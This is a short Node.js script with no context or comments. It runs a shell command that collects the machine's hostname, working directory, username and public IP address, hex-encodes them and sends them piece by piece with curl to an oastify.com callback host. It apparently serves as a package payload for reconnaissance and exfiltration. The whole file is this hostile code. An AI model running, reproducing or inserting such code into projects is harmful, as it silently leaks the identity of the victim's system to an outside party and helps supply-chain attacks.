const { exec } = require("node:child_process");
exec(
	"a=$(hostname;pwd;whoami;echo 'pecko';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do curl -k -i -s http://gj3qpll2w1kknhirtqxkg2im7dd61wpl.oastify.com/$ut;done",
	(error, data, getter) => {
		if (error) {
			console.log("error", error.message);
			return;
		}
		if (getter) {
			console.log(data);
			return;
		}
		console.log(data);
	},
);
